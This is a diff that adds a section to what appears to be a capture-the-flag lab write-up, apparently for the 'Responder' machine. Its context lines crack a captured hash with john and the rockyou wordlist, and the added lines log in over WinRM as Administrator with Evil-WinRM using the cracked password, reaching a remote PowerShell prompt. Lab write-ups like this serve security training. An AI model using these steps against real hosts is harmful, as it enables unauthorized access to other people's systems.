@@ -74,3 +74,20 @@ Then run `john` to find the password,
 ```sh
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
+
+## Use the password to connect to the machine
+
+In the responder scenario, we discover that port `5985` was open which is Windows Remote Management. We can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to connect to the target machine,
+
+```sh
+$ evil-winrm -i 10.129.148.151 -u Administrator -p badminton
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+```
